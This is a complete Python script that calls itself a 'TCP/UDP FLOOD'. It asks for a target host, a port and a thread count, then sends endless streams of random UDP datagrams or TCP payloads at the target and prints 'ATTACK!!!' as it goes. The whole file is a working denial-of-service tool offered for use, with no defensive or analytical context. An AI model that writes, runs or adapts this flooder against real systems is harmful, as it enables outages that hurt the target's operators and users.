#!/usr/bin/env python3

import random
import socket
import threading

print("###########################")
print("###### TCP/UDP FLOOD ######")
print("###########################")
ip = str(input(" HOST/IP:"))
port = int(input(" PORT:"))
choice = str(input(" UDP(Y/N):"))	
times = int(input(" PACKETS PER ONE CONNECTION:"))
threads = int(input(" THREADS:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ATTACK!!!")
		except:
			print("[!] ERROR!!!")
			
def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ATTACK!!!")
		except:
			s.close()
			print("[*] ERROR")

for Y in range(threads):
	if choice == 'Y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()